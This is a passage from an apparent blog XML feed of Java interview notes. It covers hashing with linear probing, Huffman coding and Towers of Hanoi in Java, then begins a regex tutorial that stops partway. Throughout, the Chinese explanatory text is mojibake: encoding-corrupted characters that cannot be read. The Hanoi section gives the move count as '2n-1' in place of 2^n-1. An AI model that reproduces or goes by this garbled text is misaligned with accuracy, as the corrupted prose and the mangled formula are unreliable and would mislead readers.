å¯¹äºå…¶å®ƒæ•°ï¼Œå¯ä»¥å°†å…¶è½¬æ¢æˆæ•´æ•°çš„å½¢å¼ï¼Œç„¶ååˆ©ç”¨é™¤ç•™ä½™æ•°æ³•ã€‚ä¾‹å¦‚å¯¹äºæµ®ç‚¹æ•°ï¼Œå¯ä»¥å°†å…¶è¡¨ç¤ºæˆäºŒè¿›åˆ¶å½¢å¼ï¼Œç„¶åä½¿ç”¨äºŒè¿›åˆ¶å½¢å¼çš„æ•´æ•°å€¼è¿›è¡Œé™¤ç•™ä½™æ•°æ³•ã€‚ å¯¹äºæœ‰å¤šéƒ¨åˆ†ç»„åˆçš„é”®ï¼Œæ¯éƒ¨åˆ†éƒ½éœ€è¦è®¡ç®— hash å€¼ï¼Œå¹¶ä¸”æœ€ååˆå¹¶æ—¶éœ€è¦è®©æ¯éƒ¨åˆ† hash å€¼éƒ½å…·æœ‰åŒç­‰é‡è¦çš„åœ°ä½ã€‚å¯ä»¥å°†è¯¥é”®çœ‹æˆ R è¿›åˆ¶çš„æ•´æ•°ï¼Œé”®ä¸­æ¯éƒ¨åˆ†éƒ½å…·æœ‰ä¸åŒçš„æƒå€¼ã€‚ ä¾‹å¦‚ï¼Œå­—ç¬¦ä¸²çš„æ•£åˆ—å‡½æ•°å®ç°å¦‚ä¸‹ 123int hash = 0;for (int i = 0; i &lt; s.length(); i++) hash = (R * hash + s.charAt(i)) % M; å†æ¯”å¦‚ï¼Œæ‹¥æœ‰å¤šä¸ªæˆå‘˜çš„è‡ªå®šä¹‰ç±»çš„å“ˆå¸Œå‡½æ•°å¦‚ä¸‹ï¼š 1int hash = (((day * R + month) % M) * R + year) % M; R é€šå¸¸å– 31ã€‚ Java ä¸­çš„ hashCode() å®ç°äº† hash å‡½æ•°ï¼Œä½†æ˜¯é»˜è®¤ä½¿ç”¨å¯¹è±¡çš„å†…å­˜åœ°å€å€¼ã€‚åœ¨ä½¿ç”¨ hashCode() å‡½æ•°æ—¶ï¼Œåº”å½“ç»“åˆé™¤ç•™ä½™æ•°æ³•æ¥ä½¿ç”¨ã€‚å› ä¸ºå†…å­˜åœ°å€æ˜¯ 32 ä½æ•´æ•°ï¼Œæˆ‘ä»¬åªéœ€è¦ 31 ä½çš„éè´Ÿæ•´æ•°ï¼Œå› æ­¤åº”å½“å±è”½ç¬¦å·ä½ä¹‹åå†ä½¿ç”¨é™¤ç•™ä½™æ•°æ³•ã€‚ 1int hash = (x.hashCode() &amp; 0x7fffffff) % M; ä½¿ç”¨ Java è‡ªå¸¦çš„ HashMap ç­‰è‡ªå¸¦çš„å“ˆå¸Œè¡¨å®ç°æ—¶ï¼Œåªéœ€è¦å»å®ç° Key ç±»å‹çš„ hashCode() å‡½æ•°å³å¯ã€‚Java è§„å®š hashCode() èƒ½å¤Ÿå°†é”®å‡åŒ€åˆ†å¸ƒäºæ‰€æœ‰çš„ 32 ä½æ•´æ•°ï¼ŒJava ä¸­çš„ Stringã€Integer ç­‰å¯¹è±¡çš„ hashCode() éƒ½èƒ½å®ç°è¿™ä¸€ç‚¹ã€‚ä»¥ä¸‹å±•ç¤ºäº†è‡ªå®šä¹‰ç±»å‹å¦‚ä½•å®ç° hashCode()ã€‚ 1234567891011121314151617181920public class Transaction &#123; private final String who; private final Date when; private final double amount; public Transaction(String who, Date when, double amount) &#123; this.who = who; this.when = when; this.amount = amount; &#125; public int hashCode() &#123; int hash = 17; int R = 31; hash = R * hash + who.hashCode(); hash = R * hash + when.hashCode(); hash = R * hash + ((Double) amount).hashCode(); return hash; &#125;&#125; 2. åŸºäºæ‹‰é“¾æ³•çš„æ•£åˆ—è¡¨æ‹‰é“¾æ³•ä½¿ç”¨é“¾è¡¨æ¥å­˜å‚¨ hash å€¼ç›¸åŒçš„é”®ï¼Œä»è€Œè§£å†³å†²çªã€‚æ­¤æ—¶æŸ¥æ‰¾éœ€è¦åˆ†ä¸¤æ­¥ï¼Œé¦–å…ˆæŸ¥æ‰¾ Key æ‰€åœ¨çš„é“¾è¡¨ï¼Œç„¶ååœ¨é“¾è¡¨ä¸­é¡ºåºæŸ¥æ‰¾ã€‚ å¯¹äº N ä¸ªé”®ï¼ŒM æ¡é“¾è¡¨ (N&gt;M)ï¼Œå¦‚æœå“ˆå¸Œå‡½æ•°èƒ½å¤Ÿæ»¡è¶³å‡åŒ€æ€§çš„æ¡ä»¶ï¼Œæ¯æ¡é“¾è¡¨çš„å¤§å°è¶‹å‘äº N/Mï¼Œå› æ­¤æœªå‘½ä¸­çš„æŸ¥æ‰¾å’Œæ’å…¥æ“ä½œæ‰€éœ€è¦çš„æ¯”è¾ƒæ¬¡æ•°ä¸º ~N/Mã€‚ 3. åŸºäºçº¿æ€§æ¢æµ‹æ³•çš„æ•£åˆ—è¡¨çº¿æ€§æ¢æµ‹æ³•ä½¿ç”¨ç©ºä½æ¥è§£å†³å†²çªï¼Œå½“å†²çªå‘ç”Ÿæ—¶ï¼Œå‘å‰æ¢æµ‹ä¸€ä¸ªç©ºä½æ¥å­˜å‚¨å†²çªçš„é”®ã€‚ä½¿ç”¨çº¿æ€§æ¢æµ‹æ³•ï¼Œæ•°ç»„çš„å¤§å° M åº”å½“å¤§äºé”®çš„ä¸ªæ•° Nï¼ˆM&gt;N)ã€‚ 123456789101112131415161718192021222324public class LinearProbingHashST&lt;Key, Value&gt; implements UnorderedST&lt;Key, Value&gt; &#123; private int N = 0; private int M = 16; private Key[] keys; private Value[] values; public LinearProbingHashST() &#123; init(); &#125; public LinearProbingHashST(int M) &#123; this.M = M; init(); &#125; private void init() &#123; keys = (Key[]) new Object[M]; values = (Value[]) new Object[M]; &#125; private int hash(Key key) &#123; return (key.hashCode() &amp; 0x7fffffff) % M; &#125;&#125; ï¼ˆä¸€ï¼‰æŸ¥æ‰¾ 1234567public Value get(Key key) &#123; for (int i = hash(key); keys[i] != null; i = (i + 1) % M) if (keys[i].equals(key)) return values[i]; return null;&#125; ï¼ˆäºŒï¼‰æ’å…¥ 1234567891011121314151617public void put(Key key, Value value) &#123; resize(); putInternal(key, value);&#125;private void putInternal(Key key, Value value) &#123; int i; for (i = hash(key); keys[i] != null; i = (i + 1) % M) if (keys[i].equals(key)) &#123; values[i] = value; return; &#125; keys[i] = key; values[i] = value; N++;&#125; ï¼ˆä¸‰ï¼‰åˆ é™¤ åˆ é™¤æ“ä½œåº”å½“å°†å³ä¾§æ‰€æœ‰ç›¸é‚»çš„é”®å€¼å¯¹é‡æ–°æ’å…¥æ•£åˆ—è¡¨ä¸­ã€‚ 1234567891011121314151617181920212223242526public void delete(Key key) &#123; int i = hash(key); while (keys[i] != null &amp;&amp; !key.equals(keys[i])) i = (i + 1) % M; // ä¸å­˜åœ¨ï¼Œç›´æ¥è¿”å› if (keys[i] == null) return; keys[i] = null; values[i] = null; // å°†ä¹‹åç›¸è¿çš„é”®å€¼å¯¹é‡æ–°æ’å…¥ i = (i + 1) % M; while (keys[i] != null) &#123; Key keyToRedo = keys[i]; Value valToRedo = values[i]; keys[i] = null; values[i] = null; N--; putInternal(keyToRedo, valToRedo); i = (i + 1) % M; &#125; N--; resize();&#125; ï¼ˆå››ï¼‰è°ƒæ•´æ•°ç»„å¤§å° çº¿æ€§æ¢æµ‹æ³•çš„æˆæœ¬å–å†³äºè¿ç»­æ¡ç›®çš„é•¿åº¦ï¼Œè¿ç»­æ¡ç›®ä¹Ÿå«èšç°‡ã€‚å½“èšç°‡å¾ˆé•¿æ—¶ï¼Œåœ¨æŸ¥æ‰¾å’Œæ’å…¥æ—¶ä¹Ÿéœ€è¦è¿›è¡Œå¾ˆå¤šæ¬¡æ¢æµ‹ã€‚ä¾‹å¦‚ä¸‹å›¾ä¸­ 2~5 ä½ç½®å°±æ˜¯ä¸€ä¸ªèšç°‡ã€‚ Î± = N/Mï¼ŒæŠŠ Î± ç§°ä¸ºåˆ©ç”¨ç‡ã€‚ç†è®ºè¯æ˜ï¼Œå½“ Î± å°äº 1/2 æ—¶æ¢æµ‹çš„é¢„è®¡æ¬¡æ•°åªåœ¨ 1.5 åˆ° 2.5 ä¹‹é—´ã€‚ ä¸ºäº†ä¿è¯æ•£åˆ—è¡¨çš„æ€§èƒ½ï¼Œåº”å½“è°ƒæ•´æ•°ç»„çš„å¤§å°ï¼Œä½¿å¾— Î± åœ¨ [1/4, 1/2] ä¹‹é—´ã€‚ 1234567891011121314151617private void resize() &#123; if (N &gt;= M / 2) resize(2 * M); else if (N &lt;= M / 8) resize(M / 2);&#125;private void resize(int cap) &#123; LinearProbingHashST&lt;Key, Value&gt; t = new LinearProbingHashST&lt;Key, Value&gt;(cap); for (int i = 0; i &lt; M; i++) if (keys[i] != null) t.putInternal(keys[i], values[i]); keys = t.keys; values = t.values; M = t.M;&#125; å°ç»“1. ç¬¦å·è¡¨ç®—æ³•æ¯”è¾ƒ ç®—æ³• æ’å…¥ æŸ¥æ‰¾ æ˜¯å¦æœ‰åº äºŒåˆ†æŸ¥æ‰¾å®ç°çš„æœ‰åºè¡¨ N logN yes äºŒå‰æŸ¥æ‰¾æ ‘ logN logN yes 2-3 æŸ¥æ‰¾æ ‘ logN logN yes é“¾è¡¨å®ç°çš„æœ‰åºè¡¨ N N no æ‹‰é“¾æ³•å®ç°çš„æ•£åˆ—è¡¨ N/M N/M no çº¿æ€§æ¢æµ‹æ³•å®ç°çš„æ•£åˆ—è¡¨ 1 1 no åº”å½“ä¼˜å…ˆè€ƒè™‘æ•£åˆ—è¡¨ï¼Œå½“éœ€è¦æœ‰åºæ€§æ“ä½œæ—¶ä½¿ç”¨çº¢é»‘æ ‘ã€‚ 2. Java çš„ç¬¦å·è¡¨å®ç° java.util.TreeMapï¼šçº¢é»‘æ ‘ java.util.HashMapï¼šæ‹‰é“¾æ³•çš„æ•£åˆ—è¡¨ 3. ç¨€ç–å‘é‡ä¹˜æ³•å½“å‘é‡ä¸ºç¨€ç–å‘é‡æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ç¬¦å·è¡¨æ¥å­˜å‚¨å‘é‡ä¸­çš„é 0 ç´¢å¼•å’Œå€¼ï¼Œä½¿å¾—ä¹˜æ³•è¿ç®—åªéœ€è¦å¯¹é‚£äº›é 0 å…ƒç´ è¿›è¡Œå³å¯ã€‚ 123456789101112131415161718192021public class SparseVector &#123; private HashMap&lt;Integer, Double&gt; hashMap; public SparseVector(double[] vector) &#123; hashMap = new HashMap&lt;&gt;(); for (int i = 0; i &lt; vector.length; i++) if (vector[i] != 0) hashMap.put(i, vector[i]); &#125; public double get(int i) &#123; return hashMap.getOrDefault(i, 0.0); &#125; public double dot(SparseVector other) &#123; double sum = 0; for (int i : hashMap.keySet()) sum += this.get(i) * other.get(i); return sum; &#125;&#125; ä¸ƒã€å…¶å®ƒæ±‰è¯ºå¡”è¿™æ˜¯ä¸€ä¸ªç»å…¸çš„é€’å½’é—®é¢˜ï¼Œåˆ†ä¸ºä¸‰æ­¥æ±‚è§£ï¼š å°† n-1 ä¸ªåœ†ç›˜ä» from -&gt; buffer å°† 1 ä¸ªåœ†ç›˜ä» from -&gt; to å°† n-1 ä¸ªåœ†ç›˜ä» buffer -&gt; to å¦‚æœåªæœ‰ä¸€ä¸ªåœ†ç›˜ï¼Œé‚£ä¹ˆåªéœ€è¦è¿›è¡Œä¸€æ¬¡ç§»åŠ¨æ“ä½œï¼Œä»ä¸Šé¢çš„ç§»åŠ¨æ­¥éª¤å¯ä»¥çŸ¥é“ï¼Œn åœ†ç›˜éœ€è¦ç§»åŠ¨ (n-1)+1+(n-1) = 2n-1 æ¬¡ã€‚ 123456789101112131415public class Hanoi &#123; public static void move(int n, String from, String buffer, String to) &#123; if (n == 1) &#123; System.out.println("from " + from + " to " + to); return; &#125; move(n - 1, from, to, buffer); move(1, from, buffer, to); move(n - 1, buffer, from, to); &#125; public static void main(String[] args) &#123; Hanoi.move(3, "H1", "H2", "H3"); &#125;&#125; 1234567from H1 to H3from H1 to H2from H3 to H2from H1 to H3from H2 to H1from H2 to H3from H1 to H3 å“ˆå¤«æ›¼ç¼–ç å“ˆå¤«æ›¼ç¼–ç æ ¹æ®æ•°æ®å‡ºç°çš„é¢‘ç‡å¯¹æ•°æ®è¿›è¡Œç¼–ç ï¼Œä»è€Œå‹ç¼©åŸå§‹æ•°æ®ã€‚ ä¾‹å¦‚å¯¹äºæ–‡æœ¬æ–‡ä»¶ï¼Œå…¶ä¸­å„ç§å­—ç¬¦å‡ºç°çš„æ¬¡æ•°å¦‚ä¸‹ï¼š a : 10 b : 20 c : 40 d : 80 å¯ä»¥å°†æ¯ç§å­—ç¬¦è½¬æ¢æˆäºŒè¿›åˆ¶ç¼–ç ï¼Œä¾‹å¦‚å°† a è½¬æ¢ä¸º 00ï¼Œb è½¬æ¢ä¸º 01ï¼Œc è½¬æ¢ä¸º 10ï¼Œd è½¬æ¢ä¸º 11ã€‚è¿™æ˜¯æœ€ç®€å•çš„ä¸€ç§ç¼–ç æ–¹å¼ï¼Œæ²¡æœ‰è€ƒè™‘å„ä¸ªå­—ç¬¦çš„æƒå€¼ï¼ˆå‡ºç°é¢‘ç‡ï¼‰ã€‚è€Œå“ˆå¤«æ›¼ç¼–ç èƒ½è®©å‡ºç°é¢‘ç‡æœ€å¤§çš„å­—ç¬¦ç¼–ç æœ€çŸ­ï¼Œä»è€Œä¿è¯æœ€ç»ˆçš„ç¼–ç é•¿åº¦æœ€çŸ­ã€‚ é¦–å…ˆç”Ÿæˆä¸€é¢—å“ˆå¤«æ›¼æ ‘ï¼Œæ¯æ¬¡ç”Ÿæˆè¿‡ç¨‹ä¸­é€‰å–é¢‘ç‡æœ€å°‘çš„ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œç”Ÿæˆä¸€ä¸ªæ–°èŠ‚ç‚¹ä½œä¸ºå®ƒä»¬çš„çˆ¶èŠ‚ç‚¹ï¼Œå¹¶ä¸”æ–°èŠ‚ç‚¹çš„é¢‘ç‡ä¸ºä¸¤ä¸ªèŠ‚ç‚¹çš„å’Œã€‚é€‰å–é¢‘ç‡æœ€å°‘çš„åŸå› æ˜¯ï¼Œç”Ÿæˆè¿‡ç¨‹ä½¿å¾—å…ˆé€‰å–çš„èŠ‚ç‚¹åœ¨æ ‘çš„æœ€åº•å±‚ï¼Œé‚£ä¹ˆéœ€è¦çš„ç¼–ç é•¿åº¦æ›´é•¿ï¼Œé¢‘ç‡æ›´å°‘å¯ä»¥ä½¿å¾—æ€»ç¼–ç é•¿åº¦æ›´å°‘ã€‚ ç”Ÿæˆç¼–ç æ—¶ï¼Œä»æ ¹èŠ‚ç‚¹å‡ºå‘ï¼Œå‘å·¦éå†åˆ™æ·»åŠ äºŒè¿›åˆ¶ä½ 0ï¼Œå‘å³åˆ™æ·»åŠ äºŒè¿›åˆ¶ä½ 1ï¼Œç›´åˆ°éå†åˆ°æ ¹èŠ‚ç‚¹ï¼Œæ ¹èŠ‚ç‚¹ä»£è¡¨çš„å­—ç¬¦çš„ç¼–ç å°±æ˜¯è¿™ä¸ªè·¯å¾„ç¼–ç ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455public class Huffman &#123; private class Node implements Comparable&lt;Node&gt; &#123; char ch; int freq; boolean isLeaf; Node left, right; public Node(char ch, int freq) &#123; this.ch = ch; this.freq = freq; isLeaf = true; &#125; public Node(Node left, Node right, int freq) &#123; this.left = left; this.right = right; this.freq = freq; isLeaf = false; &#125; @Override public int compareTo(Node o) &#123; return this.freq - o.freq; &#125; &#125; public Map&lt;Character, String&gt; encode(Map&lt;Character, Integer&gt; frequencyForChar) &#123; PriorityQueue&lt;Node&gt; priorityQueue = new PriorityQueue&lt;&gt;(); for (Character c : frequencyForChar.keySet()) &#123; priorityQueue.add(new Node(c, frequencyForChar.get(c))); &#125; while (priorityQueue.size() != 1) &#123; Node node1 = priorityQueue.poll(); Node node2 = priorityQueue.poll(); priorityQueue.add(new Node(node1, node2, node1.freq + node2.freq)); &#125; return encode(priorityQueue.poll()); &#125; private Map&lt;Character, String&gt; encode(Node root) &#123; Map&lt;Character, String&gt; encodingForChar = new HashMap&lt;&gt;(); encode(root, "", encodingForChar); return encodingForChar; &#125; private void encode(Node node, String encoding, Map&lt;Character, String&gt; encodingForChar) &#123; if (node.isLeaf) &#123; encodingForChar.put(node.ch, encoding); return; &#125; encode(node.left, encoding + '0', encodingForChar); encode(node.right, encoding + '1', encodingForChar); &#125;&#125; å‚è€ƒèµ„æ–™ Sedgewick, Robert, and Kevin Wayne. Algorithms. Addison-Wesley Professional, 2011.]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ­£åˆ™è¡¨è¾¾å¼]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[ä¸€ã€æ¦‚è¿° äºŒã€åŒ¹é…å•ä¸ªå­—ç¬¦ ä¸‰ã€åŒ¹é…ä¸€ç»„å­—ç¬¦ å››ã€ä½¿ç”¨å…ƒå­—ç¬¦ äº”ã€é‡å¤åŒ¹é… å…­ã€ä½ç½®åŒ¹é… ä¸ƒã€ä½¿ç”¨å­è¡¨è¾¾å¼ å…«ã€å›æº¯å¼•ç”¨ ä¹ã€å‰åæŸ¥æ‰¾ åã€åµŒå…¥æ¡ä»¶ å‚è€ƒèµ„æ–™ ä¸€ã€æ¦‚è¿°æ­£åˆ™è¡¨è¾¾å¼ç”¨äºæ–‡æœ¬å†…å®¹çš„æŸ¥æ‰¾å’Œæ›¿æ¢ã€‚ æ­£åˆ™è¡¨è¾¾å¼å†…ç½®äºå…¶å®ƒè¯­è¨€æˆ–è€…è½¯ä»¶äº§å“ä¸­ï¼Œå®ƒæœ¬èº«ä¸æ˜¯ä¸€ç§è¯­è¨€æˆ–è€…è½¯ä»¶ã€‚ æ­£åˆ™è¡¨è¾¾å¼åœ¨çº¿å·¥å…· äºŒã€åŒ¹é…å•ä¸ªå­—ç¬¦æ­£åˆ™è¡¨è¾¾å¼ä¸€èˆ¬æ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼Œä½†æ˜¯ä¹Ÿæœ‰äº›å®ç°æ˜¯ä¸åŒºåˆ†ã€‚ . å¯ä»¥ç”¨æ¥åŒ¹é…ä»»ä½•çš„å•ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯åœ¨ç»å¤§å¤šæ•°å®ç°é‡Œé¢ï¼Œä¸èƒ½åŒ¹é…æ¢è¡Œç¬¦ï¼› \ æ˜¯å…ƒå­—ç¬¦ï¼Œè¡¨ç¤ºå®ƒæœ‰ç‰¹æ®Šçš„å«ä¹‰ï¼Œè€Œä¸æ˜¯å­—ç¬¦æœ¬èº«çš„å«ä¹‰ã€‚å¦‚æœéœ€è¦åŒ¹é… . ï¼Œé‚£ä¹ˆè¦ç”¨ \ è¿›è¡Œè½¬ä¹‰ï¼Œå³åœ¨ . å‰é¢åŠ ä¸Š \ ã€‚ æ­£åˆ™è¡¨è¾¾å¼ 1nam. åŒ¹é…ç»“æœ My name is Zheng. ä¸‰ã€åŒ¹é…ä¸€ç»„å­—ç¬¦[ ] å®šä¹‰ä¸€ä¸ªå­—ç¬¦é›†åˆï¼› 0-9ã€a-z å®šä¹‰äº†ä¸€ä¸ªå­—ç¬¦åŒºé—´ï¼ŒåŒºé—´ä½¿ç”¨ ASCII ç æ¥ç¡®å®šï¼Œå­—ç¬¦åŒºé—´åªèƒ½ç”¨åœ¨ [ ] ä¹‹é—´ã€‚ - å…ƒå­—ç¬¦åªæœ‰åœ¨ [ ] ä¹‹é—´æ‰æ˜¯å…ƒå­—ç¬¦ï¼Œåœ¨ [ ] ä¹‹å¤–å°±æ˜¯ä¸€ä¸ªæ™®é€šå­—ç¬¦ï¼› ^ åœ¨ [ ] å­—ç¬¦é›†åˆä¸­æ˜¯å–éæ“ä½œã€‚ åº”ç”¨ åŒ¹é…ä»¥ abc ä¸ºå¼€å¤´ï¼Œå¹¶ä¸”æœ€åä¸€ä¸ªå­—æ¯ä¸ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²ï¼š æ­£åˆ™è¡¨è¾¾å¼ 1abc[^0-9] åŒ¹é…ç»“æœ abcd abc1 abc2 å››ã€ä½¿ç”¨å…ƒå­—ç¬¦åŒ¹é…ç©ºç™½å­—ç¬¦ å…ƒå­—ç¬¦ è¯´æ˜ [\b] å›é€€ï¼ˆåˆ é™¤ï¼‰ä¸€ä¸ªå­—ç¬¦ \f æ¢é¡µç¬¦ \n æ¢è¡Œç¬¦ \r å›è½¦ç¬¦ \t åˆ¶è¡¨ç¬¦ \v å‚ç›´åˆ¶è¡¨ç¬¦ \r\n æ˜¯ Windows ä¸­çš„æ–‡æœ¬è¡Œç»“æŸæ ‡ç­¾ï¼Œåœ¨ Unix/Linux åˆ™æ˜¯ \n ï¼›\r\n\r\n å¯ä»¥åŒ¹é… Windows ä¸‹çš„ç©ºç™½è¡Œï¼Œå› ä¸ºå®ƒå°†åŒ¹é…ä¸¤ä¸ªè¿ç»­çš„è¡Œå°¾æ ‡ç­¾ï¼Œè€Œè¿™æ­£æ˜¯ä¸¤æ¡è®°å½•ä¹‹é—´çš„ç©ºç™½è¡Œï¼› . æ˜¯å…ƒå­—ç¬¦ï¼Œå‰ææ˜¯æ²¡æœ‰å¯¹å®ƒä»¬è¿›è¡Œè½¬ä¹‰ï¼›f å’Œ n ä¹Ÿæ˜¯å…ƒå­—ç¬¦ï¼Œä½†æ˜¯å‰ææ˜¯å¯¹å®ƒä»¬è¿›è¡Œäº†è½¬ä¹‰ã€‚ åŒ¹é…ç‰¹å®šçš„å­—ç¬¦ç±»åˆ«1. æ•°å­—å…ƒå­—ç¬¦ å…ƒå­—ç¬¦ è¯´æ˜ \d æ•°å­—å­—ç¬¦ï¼Œç­‰ä»·äº [0-9] \D éæ•°å­—å­—ç¬¦ï¼Œç­‰ä»·äº [^0-9] 2. å­—æ¯æ•°å­—å…ƒå­—ç¬¦ å…ƒå­—ç¬¦ è¯´æ˜ \w å¤§å°å†™å­—æ¯ï¼Œä¸‹åˆ’çº¿å’Œæ•°å­—ï¼Œç­‰ä»·äº [a-zA-Z0-9_] \W å¯¹ \w å–é 3. ç©ºç™½å­—ç¬¦å…ƒå­—ç¬¦ å…ƒå­—ç¬¦ è¯´æ˜ \s ä»»ä½•ä¸€ä¸ªç©ºç™½å­—ç¬¦ï¼Œç­‰ä»·äº [\f\n\r\t\v] \S å¯¹ \s å–é \x åŒ¹é…åå…­è¿›åˆ¶å­—ç¬¦ï¼Œ\0 åŒ¹é…å…«è¿›åˆ¶ï¼Œä¾‹å¦‚ \x0A å¯¹åº” ASCII å­—ç¬¦ 10 ï¼Œç­‰ä»·äº \nï¼Œä¹Ÿå°±æ˜¯å®ƒä¼šåŒ¹é… \n ã€‚ äº”ã€é‡å¤åŒ¹é…+ åŒ¹é… 1 ä¸ªæˆ–è€…å¤šä¸ªå­—ç¬¦ï¼Œ * åŒ¹é… 0 ä¸ªæˆ–è€…å¤šä¸ªï¼Œ? åŒ¹é… 0 ä¸ªæˆ–è€… 1 ä¸ªã€‚ åº”ç”¨ åŒ¹é…é‚®ç®±åœ°å€ã€‚ æ­£åˆ™è¡¨è¾¾å¼ 1[\w.]+@\w+\.\w+ [\w.] åŒ¹é…çš„æ˜¯å­—æ¯æ•°å­—æˆ–è€… . ï¼Œåœ¨å…¶åé¢åŠ ä¸Š + ï¼Œè¡¨ç¤ºåŒ¹é…å¤šæ¬¡ã€‚åœ¨å­—ç¬¦é›†åˆ [ ] é‡Œï¼Œ. ä¸æ˜¯å…ƒå­—ç¬¦ï¼› åŒ¹é…ç»“æœ abc.def@qq.com ä¸ºäº†å¯è¯»æ€§ï¼Œå¸¸å¸¸æŠŠè½¬ä¹‰çš„å­—ç¬¦æ”¾åˆ°å­—ç¬¦é›†åˆ [ ] ä¸­ï¼Œä½†æ˜¯å«ä¹‰æ˜¯ç›¸åŒçš„ã€‚ 12[\w.]+@\w+\.\w+[\w.]+@[\w]+[\.][\w]+ {n} åŒ¹é… n ä¸ªå­—ç¬¦ï¼Œ{m, n} åŒ¹é… m~n ä¸ªå­—ç¬¦ï¼Œ{m,} è‡³å°‘åŒ¹é… m ä¸ªå­—ç¬¦ï¼› * å’Œ + éƒ½æ˜¯è´ªå©ªå‹å…ƒå­—ç¬¦ï¼Œä¼šåŒ¹é…æœ€å¤šçš„å†…å®¹ï¼Œåœ¨å…ƒå­—ç¬¦åé¢åŠ  ? å¯ä»¥è½¬æ¢ä¸ºæ‡’æƒ°å‹å…ƒå­—ç¬¦ï¼Œä¾‹å¦‚ *?ã€+? å’Œ {m, n}? ã€‚ æ­£åˆ™è¡¨è¾¾å¼ 1a.+c ç”±äº + æ˜¯è´ªå©ªå‹çš„ï¼Œå› æ­¤ .+ ä¼šåŒ¹é…æ›´å¯èƒ½å¤šçš„å†…å®¹ï¼Œæ‰€ä»¥ä¼šæŠŠæ•´ä¸ª abcabcabc æ–‡æœ¬éƒ½åŒ¹é…ï¼Œè€Œä¸æ˜¯åªåŒ¹é…å‰é¢çš„ abc æ–‡æœ¬ã€‚ç”¨æ‡’æƒ°å‹å¯ä»¥å®ç°åŒ¹é…å‰é¢çš„ã€‚ åŒ¹é…ç»“æœ abcabcabc å…­ã€ä½ç½®åŒ¹é…å•è¯è¾¹ç•Œ\b å¯ä»¥åŒ¹é…ä¸€ä¸ªå•è¯çš„è¾¹ç•Œï¼Œè¾¹ç•Œæ˜¯æŒ‡ä½äº \w å’Œ \W ä¹‹é—´çš„ä½ç½®ï¼›\B åŒ¹é…ä¸€ä¸ªä¸æ˜¯å•è¯è¾¹ç•Œçš„ä½ç½®ã€‚ \b åªåŒ¹é…ä½ç½®ï¼Œä¸åŒ¹é…å­—ç¬¦ï¼Œå› æ­¤ \babc\b åŒ¹é…å‡ºæ¥çš„ç»“æœä¸º 3 ä¸ªå­—ç¬¦ã€‚ å­—ç¬¦ä¸²è¾¹ç•Œ^ åŒ¹é…æ•´ä¸ªå­—ç¬¦ä¸²çš„å¼€å¤´ï¼Œ$ åŒ¹é…ç»“å°¾ã€‚ ^ å…ƒå­—ç¬¦åœ¨å­—ç¬¦é›†åˆä¸­ç”¨ä½œæ±‚éï¼Œåœ¨å­—ç¬¦é›†åˆå¤–ç”¨ä½œåŒ¹é…å­—ç¬¦ä¸²çš„å¼€å¤´ã€‚ åˆ†è¡ŒåŒ¹é…æ¨¡å¼ï¼ˆmultilineï¼‰ä¸‹ï¼Œæ¢è¡Œè¢«å½“åšå­—ç¬¦ä¸²çš„è¾¹ç•Œã€‚ åº”ç”¨ åŒ¹é…ä»£ç ä¸­ä»¥ // å¼€å§‹çš„æ³¨é‡Šè¡Œ æ­£åˆ™è¡¨è¾¾å¼ 1^\s*\/\/.*$ åŒ¹é…ç»“æœ public void fun() { &nbsp;&nbsp;&nbsp;&nbsp; // æ³¨é‡Š 1 &nbsp;&nbsp;&nbsp;&nbsp; int a = 1; &nbsp;&nbsp;&nbsp;&nbsp; int b = 2; &nbsp;&nbsp;&nbsp;&nbsp; // æ³¨é‡Š 2 &nbsp;&nbsp;&nbsp;&nbsp; int c = a + b; } ä¸ƒã€ä½¿ç”¨å­è¡¨è¾¾å¼ä½¿ç”¨ ( ) å®šä¹‰ä¸€ä¸ªå­è¡¨è¾¾å¼ã€‚å­è¡¨è¾¾å¼çš„å†…å®¹å¯ä»¥å½“æˆä¸€ä¸ªç‹¬ç«‹å…ƒç´ ï¼Œå³å¯ä»¥å°†å®ƒçœ‹æˆä¸€ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸”ä½¿ç”¨ * ç­‰å…ƒå­—ç¬¦ã€‚ å­è¡¨è¾¾å¼å¯ä»¥åµŒå¥—ï¼Œä½†æ˜¯åµŒå¥—å±‚æ¬¡è¿‡æ·±ä¼šå˜å¾—å¾ˆéš¾ç†è§£ã€‚ æ­£åˆ™è¡¨è¾¾å¼ 1(ab)&#123;2,&#125; åŒ¹é…ç»“æœ ababab | æ˜¯æˆ–å…ƒå­—ç¬¦ï¼Œå®ƒæŠŠå·¦è¾¹å’Œå³è¾¹æ‰€æœ‰çš„éƒ¨åˆ†éƒ½çœ‹æˆå•ç‹¬çš„ä¸¤ä¸ªéƒ¨åˆ†ï¼Œä¸¤ä¸ªéƒ¨åˆ†åªè¦æœ‰ä¸€ä¸ªåŒ¹é…å°±è¡Œã€‚ æ­£åˆ™è¡¨è¾¾å¼ 1(19|20)\d&#123;2&#125; åŒ¹é…ç»“æœ 1900 2010 1020 åº”ç”¨ åŒ¹é… IP åœ°å€ã€‚IP åœ°å€ä¸­æ¯éƒ¨åˆ†éƒ½æ˜¯ 0-255 çš„æ•°å­—ï¼Œç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æ—¶ä»¥ä¸‹æƒ…å†µæ˜¯åˆæ³•çš„ï¼š ä¸€ä½æ•°å­— ä¸ä»¥ 0 å¼€å¤´çš„ä¸¤ä½æ•°å­— 1 å¼€å¤´çš„ä¸‰ä½æ•° 2 å¼€å¤´ï¼Œç¬¬ 2 ä½æ˜¯ 0-4 çš„ä¸‰ä½æ•° 25 å¼€å¤´ï¼Œç¬¬ 3 ä½æ˜¯ 0-5 çš„ä¸‰ä½æ•° æ­£åˆ™è¡¨è¾¾å¼ 